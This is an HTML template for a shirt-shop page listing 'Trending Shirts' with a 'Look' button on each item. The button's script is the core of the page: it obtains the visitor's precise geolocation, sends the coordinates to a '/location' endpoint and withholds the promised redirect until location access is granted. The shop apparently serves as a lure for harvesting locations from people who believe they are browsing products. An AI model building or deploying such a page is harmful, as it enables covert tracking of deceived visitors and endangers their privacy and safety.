<!DOCTYPE html>
<html>
<head>
  <title>Shop Now</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      padding: 20px;
      margin: 0;
      background: #f9f9f9;
    }
    .shirt {
      border: 1px solid #ccc;
      border-radius: 12px;
      padding: 15px;
      margin: 10px;
      max-width: 300px;
      display: inline-block;
      background: white;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    .shirt img {
      width: 100%;
      border-radius: 10px;
    }
    .shirt h2 {
      font-size: 1.2rem;
      margin: 10px 0;
    }
    .shirt p {
      color: #444;
    }
    .btn {
      padding: 10px 20px;
      background: #000;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .btn:disabled {
      background: #999;
    }
  </style>
</head>
<body>

  <h1>üõçÔ∏è Trending Shirts</h1>
  {% for shirt in shirts %}
    <div class="shirt">
      <img src="/static/{{ shirt.image }}" alt="{{ shirt.name }}">
      <h2>{{ shirt.name }}</h2>
      <p>Price: {{ shirt.price }}</p>
      <button class="btn" onclick="trackAndRedirect('{{ shirt.link }}', this)">Look</button>
    </div>
  {% endfor %}

  <script>
    async function trackAndRedirect(link, button) {
      button.disabled = true;
      button.innerText = "Loding...";

      try {
        const pos = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej);
        });

        const data = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        };

        const res = await fetch("/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

        const result = await res.json();
        alert(result.message || result.error);

        window.location.replace(link);

      } catch (err) {
        alert("‚ö†Ô∏è Please allow location access.");
        button.disabled = false;
        button.innerText = "Look";
      }
    }
  </script>

</body>
</html>
